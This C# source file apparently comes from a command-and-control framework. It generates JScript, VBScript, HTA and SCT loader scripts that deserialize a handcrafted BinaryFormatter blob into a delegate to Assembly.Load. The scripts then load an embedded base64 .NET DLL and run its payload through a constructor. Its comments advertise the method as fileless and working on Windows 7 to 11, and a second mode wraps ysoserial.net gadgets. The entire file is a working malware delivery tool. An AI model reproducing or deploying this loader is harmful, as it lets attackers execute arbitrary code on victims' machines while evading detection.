using System.Text;

namespace C2.Features.Loaders;

public enum D2JSFormat { JScript, VBScript, Hta, Sct }

/// <summary>
/// Generates scripts (JScript / VBScript / HTA / SCT) that load a .NET assembly
/// from an embedded base64 blob and execute an entry class via constructor injection.
///
/// Assembly loading flow (executed by wscript / cscript / mshta):
///   1. COMPLUS_Version env-var pins the target CLR version
///   2. A tiny NRBF blob is deserialized via BinaryFormatter — it reconstructs a
///      Converter&lt;byte[],Assembly&gt; delegate pointing to Assembly.Load(byte[])
///      using DelegateSerializationHolder (all types in mscorlib)
///   3. DLL bytes are decoded from a second embedded base64 blob
///   4. Delegate.DynamicInvoke([dllBytes]) calls Assembly.Load — loads the DLL
///      (Delegate has ClassInterfaceType.AutoDual → DynamicInvoke callable via IDispatch)
///   5. Assembly.CreateInstance(entryClass) triggers the constructor — payload runs
///      (_Assembly is InterfaceIsDual → CreateInstance callable via IDispatch)
///
/// COM interface compatibility (why this works):
///   - Object.GetType()    → auto class interface, unreliable for returned objects  ✗
///   - MethodInfo.Invoke()  → _MethodBase is InterfaceIsIUnknown (no IDispatch)     ✗
///   - Type.InvokeMember_3 → _Type is InterfaceIsDual but not default dispatch      ✗
///   - Delegate.DynamicInvoke → AutoDual class interface (always IDispatch)          ✓
///   - Assembly.CreateInstance → _Assembly is InterfaceIsDual                        ✓
///
/// Works Windows 7 → 11, no external DLLs, completely fileless.
/// </summary>
public static class D2JSGenerator
{
    /// <summary>
    /// Pre-computed base64 NRBF blob that deserializes into a Converter&lt;byte[],Assembly&gt;
    /// delegate pointing to Assembly.Load(byte[]) via DelegateSerializationHolder.
    /// </summary>
    private static readonly Lazy<string> LoaderNrbfBase64 = new(() =>
        Convert.ToBase64String(BuildAssemblyLoaderNrbf()));

    /// <summary>
    /// Assembly mode — loads a .NET DLL from base64 and creates an instance
    /// of <paramref name="entryClass"/>.  The payload runs in the constructor.
    /// </summary>
    public static string Generate(string assemblyBase64, string entryClass,
        D2JSFormat format, string runtimeVersion)
    {
        var loaderB64 = LoaderNrbfBase64.Value;
        return format switch
        {
            D2JSFormat.JScript  => BuildJScript(assemblyBase64, entryClass, runtimeVersion, loaderB64),
            D2JSFormat.VBScript => BuildVBScript(assemblyBase64, entryClass, runtimeVersion, loaderB64),
            D2JSFormat.Hta      => BuildHta(assemblyBase64, entryClass, runtimeVersion, loaderB64),
            D2JSFormat.Sct      => BuildSct(assemblyBase64, entryClass, runtimeVersion, loaderB64),
            _ => ""
        };
    }

    /// <summary>
    /// Blob mode — deserializes a pre-built BinaryFormatter payload from base64.
    /// Use with ysoserial.net gadgets or the original DotNetToJScript tool.
    /// </summary>
    public static string GenerateFromBlob(string serializedBase64,
        D2JSFormat format, string runtimeVersion)
    {
        return format switch
        {
            D2JSFormat.JScript  => BuildJScriptBlob(serializedBase64, runtimeVersion),
            D2JSFormat.VBScript => BuildVBScriptBlob(serializedBase64, runtimeVersion),
            D2JSFormat.Hta      => BuildHtaBlob(serializedBase64, runtimeVersion),
            D2JSFormat.Sct      => BuildSctBlob(serializedBase64, runtimeVersion),
            _ => ""
        };
    }

    // ── NRBF Builder ────────────────────────────────────────────────────

    /// <summary>
    /// Constructs an NRBF stream that deserializes into a Converter&lt;byte[],Assembly&gt;
    /// delegate pointing to Assembly.Load(byte[]).
    ///
    /// Uses DelegateSerializationHolder (ISerializable + IObjectReference) with a nested
    /// DelegateEntry that specifies the target type, method, and delegate type.
    /// All types live in mscorlib — BinaryFormatter can always resolve them.
    ///
    /// The returned delegate inherits from Delegate which has ClassInterfaceType.AutoDual,
    /// so DynamicInvoke is callable from JScript/VBScript via IDispatch.
    ///
    /// NRBF layout:
    ///   Header → BinaryLibrary "mscorlib"
    ///   → DelegateSerializationHolder (root, objectId 1)
    ///       members: "Delegate" (DelegateEntry) + "method0" (null)
    ///   → DelegateEntry (objectId 3, inline)
    ///       type / assembly / target / targetTypeAssembly / targetTypeName / methodName / delegateEntry
    ///   → MessageEnd
    /// </summary>
    private static byte[] BuildAssemblyLoaderNrbf()
    {
        using var ms = new MemoryStream();
        using var w = new BinaryWriter(ms);

        // ── Header ──────────────────────────────────────────────────────
        w.Write((byte)0);   // RecordType: SerializedStreamHeader
        w.Write(1);          // RootId
        w.Write(-1);         // HeaderId
        w.Write(1);          // MajorVersion
        w.Write(0);          // MinorVersion

        // ── BinaryLibrary (mscorlib) ────────────────────────────────────
        w.Write((byte)12);  // RecordType: BinaryLibrary
        w.Write(2);          // LibraryId
        WritePrefixedString(w, "mscorlib");

        // ── DelegateSerializationHolder (root, objectId 1) ──────────────
        w.Write((byte)5);                  // RecordType: ClassWithMembersAndTypes
        w.Write(1);                        // ObjectId (root)
        WritePrefixedString(w, "System.DelegateSerializationHolder");
        w.Write(2);                        // MemberCount
        WritePrefixedString(w, "Delegate");
        WritePrefixedString(w, "method0");
        w.Write((byte)3);                  // BinaryType: SystemClass
        w.Write((byte)3);                  // BinaryType: SystemClass
        WritePrefixedString(w, "System.DelegateSerializationHolder+DelegateEntry");
        WritePrefixedString(w, "System.Reflection.MethodInfo");
        w.Write(2);                        // LibraryId

        // ── Value of "Delegate": inline DelegateEntry (objectId 3) ──────
        w.Write((byte)5);                  // RecordType: ClassWithMembersAndTypes
        w.Write(3);                        // ObjectId
        WritePrefixedString(w, "System.DelegateSerializationHolder+DelegateEntry");
        w.Write(7);                        // MemberCount
        WritePrefixedString(w, "type");
        WritePrefixedString(w, "assembly");
        WritePrefixedString(w, "target");
        WritePrefixedString(w, "targetTypeAssembly");
        WritePrefixedString(w, "targetTypeName");
        WritePrefixedString(w, "methodName");
        WritePrefixedString(w, "delegateEntry");
        w.Write((byte)1);                  // String
        w.Write((byte)1);                  // String
        w.Write((byte)2);                  // Object
        w.Write((byte)1);                  // String
        w.Write((byte)1);                  // String
        w.Write((byte)1);                  // String
        w.Write((byte)3);                  // SystemClass
        WritePrefixedString(w, "System.DelegateSerializationHolder+DelegateEntry");
        w.Write(2);                        // LibraryId

        // ── DelegateEntry member values ─────────────────────────────────

        // "type" — Converter<byte[], Assembly>
        w.Write((byte)6);                  // BinaryObjectString
        w.Write(4);                        // ObjectId
        WritePrefixedString(w, "System.Converter`2[[System.Byte[],mscorlib],[System.Reflection.Assembly,mscorlib]]");

        // "assembly" — mscorlib
        w.Write((byte)6); w.Write(5);
        WritePrefixedString(w, "mscorlib");

        // "target" — null (static method)
        w.Write((byte)10);                 // ObjectNull

        // "targetTypeAssembly" — reuse "mscorlib" string via MemberReference
        w.Write((byte)9);                  // MemberReference
        w.Write(5);                        // IdRef → objectId 5

        // "targetTypeName"
        w.Write((byte)6); w.Write(6);
        WritePrefixedString(w, "System.Reflection.Assembly");

        // "methodName"
        w.Write((byte)6); w.Write(7);
        WritePrefixedString(w, "Load");

        // "delegateEntry" — null (single delegate, no chain)
        w.Write((byte)10);                 // ObjectNull

        // ── Value of "method0": null ────────────────────────────────────
        w.Write((byte)10);                 // ObjectNull

        // ── End ─────────────────────────────────────────────────────────
        w.Write((byte)11);                 // MessageEnd

        return ms.ToArray();
    }

    private static void WritePrefixedString(BinaryWriter w, string s)
    {
        var bytes = Encoding.UTF8.GetBytes(s);
        Write7BitInt(w, bytes.Length);
        w.Write(bytes);
    }

    private static void Write7BitInt(BinaryWriter w, int value)
    {
        while (value >= 0x80)
        {
            w.Write((byte)(value | 0x80));
            value >>= 7;
        }
        w.Write((byte)value);
    }

    // ── Assembly Mode Templates ─────────────────────────────────────────

    private static string BuildJScript(string asmB64, string entry, string ver, string loaderB64)
    {
        return $@"function setversion() {{
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = '{ver}';
}}

function b64decode(b) {{
    var enc = new ActiveXObject('System.Text.ASCIIEncoding');
    var len = enc.GetByteCount_2(b);
    var ba  = enc.GetBytes_4(b);
    var tfm = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
    return tfm.TransformFinalBlock(ba, 0, len);
}}

function b64stream(b) {{
    var ba  = b64decode(b);
    var ms  = new ActiveXObject('System.IO.MemoryStream');
    var pad = (b.slice(-2) == '==') ? 2 : (b.slice(-1) == '=') ? 1 : 0;
    ms.Write(ba, 0, (b.length / 4) * 3 - pad);
    ms.Position = 0;
    return ms;
}}

var loader_b64 = ""{loaderB64}"";
var asm_b64    = ""{asmB64}"";

setversion();

var fmt    = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var loader = fmt.Deserialize_2(b64stream(loader_b64));

var dllBytes = b64decode(asm_b64);
var al = new ActiveXObject('System.Collections.ArrayList');
al.Add(dllBytes);
var asm = loader.DynamicInvoke(al.ToArray());

asm.CreateInstance('{entry}');";
    }

    private static string BuildVBScript(string asmB64, string entry, string ver, string loaderB64)
    {
        var asmLines = FormatVBString("asm_b64", asmB64);

        return $@"Sub SetVersion()
    Dim shell
    Set shell = CreateObject(""WScript.Shell"")
    shell.Environment(""Process"")(""COMPLUS_Version"") = ""{ver}""
End Sub

Function B64Decode(b)
    Dim enc, len, ba, tfm
    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
    len = enc.GetByteCount_2(b)
    ba  = enc.GetBytes_4(b)
    Set tfm = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    B64Decode = tfm.TransformFinalBlock(ba, 0, len)
End Function

Function B64Stream(b)
    Dim ba, ms, pad
    ba = B64Decode(b)
    Set ms = CreateObject(""System.IO.MemoryStream"")
    pad = 0
    If Right(b, 2) = ""=="" Then
        pad = 2
    ElseIf Right(b, 1) = ""="" Then
        pad = 1
    End If
    ms.Write ba, 0, (Len(b) \ 4) * 3 - pad
    ms.Position = 0
    Set B64Stream = ms
End Function

Dim loader_b64
loader_b64 = ""{loaderB64}""

{asmLines}

SetVersion

Dim fmt
Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
Dim loader
Set loader = fmt.Deserialize_2(B64Stream(loader_b64))

Dim dllBytes
dllBytes = B64Decode(asm_b64)
Dim al
Set al = CreateObject(""System.Collections.ArrayList"")
al.Add dllBytes
Dim asm
Set asm = loader.DynamicInvoke(al.ToArray())

asm.CreateInstance ""{entry}""";
    }

    private static string BuildHta(string asmB64, string entry, string ver, string loaderB64)
    {
        var js = BuildJScript(asmB64, entry, ver, loaderB64);
        return $@"<html>
<head>
<script language=""JScript"">
{js}
window.close();
</script>
</head>
<body></body>
</html>";
    }

    private static string BuildSct(string asmB64, string entry, string ver, string loaderB64)
    {
        var js = BuildJScript(asmB64, entry, ver, loaderB64);
        var guid = Guid.NewGuid().ToString();
        return $@"<?XML version=""1.0""?>
<scriptlet>
<registration
    progid=""d2js""
    classid=""{{{guid}}}"">
<script language=""JScript"">
<![CDATA[
{js}
]]>
</script>
</registration>
</scriptlet>";
    }

    // ── Blob Mode Templates ─────────────────────────────────────────────

    private static string BuildJScriptBlob(string b64, string ver)
    {
        return $@"function setversion() {{
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = '{ver}';
}}

function base64ToStream(b) {{
    var enc = new ActiveXObject('System.Text.ASCIIEncoding');
    var len = enc.GetByteCount_2(b);
    var ba  = enc.GetBytes_4(b);
    var tfm = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
    ba = tfm.TransformFinalBlock(ba, 0, len);
    var ms  = new ActiveXObject('System.IO.MemoryStream');
    var pad = (b.slice(-2) == '==') ? 2 : (b.slice(-1) == '=') ? 1 : 0;
    ms.Write(ba, 0, (len / 4) * 3 - pad);
    ms.Position = 0;
    return ms;
}}

var serialized_obj = ""{b64}"";

setversion();
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var stm = base64ToStream(serialized_obj);
fmt.Deserialize_2(stm);";
    }

    private static string BuildVBScriptBlob(string b64, string ver)
    {
        var blobLines = FormatVBString("serialized_obj", b64);

        return $@"Sub SetVersion()
    Dim shell
    Set shell = CreateObject(""WScript.Shell"")
    shell.Environment(""Process"")(""COMPLUS_Version"") = ""{ver}""
End Sub

Function Base64ToStream(b)
    Dim enc, len, ba, tfm, ms, pad
    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
    len = enc.GetByteCount_2(b)
    ba  = enc.GetBytes_4(b)
    Set tfm = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    ba = tfm.TransformFinalBlock(ba, 0, len)
    Set ms = CreateObject(""System.IO.MemoryStream"")
    pad = 0
    If Right(b, 2) = ""=="" Then
        pad = 2
    ElseIf Right(b, 1) = ""="" Then
        pad = 1
    End If
    ms.Write ba, 0, (len \ 4) * 3 - pad
    ms.Position = 0
    Set Base64ToStream = ms
End Function

{blobLines}

SetVersion
Dim fmt
Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
Dim stm
Set stm = Base64ToStream(serialized_obj)
fmt.Deserialize_2 stm";
    }

    private static string BuildHtaBlob(string b64, string ver)
    {
        var js = BuildJScriptBlob(b64, ver);
        return $@"<html>
<head>
<script language=""JScript"">
{js}
window.close();
</script>
</head>
<body></body>
</html>";
    }

    private static string BuildSctBlob(string b64, string ver)
    {
        var js = BuildJScriptBlob(b64, ver);
        var guid = Guid.NewGuid().ToString();
        return $@"<?XML version=""1.0""?>
<scriptlet>
<registration
    progid=""d2js""
    classid=""{{{guid}}}"">
<script language=""JScript"">
<![CDATA[
{js}
]]>
</script>
</registration>
</scriptlet>";
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private static string FormatVBString(string name, string value)
    {
        const int chunk = 200;
        var sb = new StringBuilder();

        if (value.Length <= chunk)
        {
            sb.Append($"Dim {name}\n{name} = \"{value}\"");
            return sb.ToString();
        }

        sb.AppendLine($"Dim {name}");
        sb.AppendLine($"{name} = \"\"");
        for (var i = 0; i < value.Length; i += chunk)
        {
            var c = value.Substring(i, Math.Min(chunk, value.Length - i));
            sb.AppendLine($"{name} = {name} & \"{c}\"");
        }
        return sb.ToString().TrimEnd();
    }
}
